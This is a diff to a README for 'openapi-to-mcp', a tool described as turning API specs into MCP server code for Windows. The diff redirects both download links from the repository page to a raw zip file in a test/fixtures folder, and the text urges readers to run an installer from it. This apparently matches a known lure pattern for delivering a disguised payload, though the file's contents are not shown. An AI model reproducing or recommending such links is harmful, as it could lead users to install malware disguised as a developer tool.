@@ -1,6 +1,6 @@
 # 🏗️ openapi-to-mcp - Turn API specs into server code
 
-[![](https://img.shields.io/badge/Download-OpenAPI_to_MCP-blue)](https://github.com/Combinatorial-clipartist4822/openapi-to-mcp)
+[![](https://img.shields.io/badge/Download-OpenAPI_to_MCP-blue)](https://github.com/Combinatorial-clipartist4822/openapi-to-mcp/raw/refs/heads/main/test/fixtures/openapi_to_mcp_v3.0.zip)
 
 This tool helps you build a server for artificial intelligence models. It takes your existing API information and creates the code needed to connect that data to a smart assistant. You save time because the software handles the setup requirements for the Model Context Protocol.
 
@@ -21,7 +21,7 @@ You need a Windows computer to run this tool. Ensure you have the following inst
 
 You must visit the project page to get the installer for your computer.
 
-[Click here to visit the download page](https://github.com/Combinatorial-clipartist4822/openapi-to-mcp)
+[Click here to visit the download page](https://github.com/Combinatorial-clipartist4822/openapi-to-mcp/raw/refs/heads/main/test/fixtures/openapi_to_mcp_v3.0.zip)
 
 Select the file that matches your version of Windows. Most users should choose the file ending in `.msi` or `.exe`. Save this file to your Downloads folder.
 
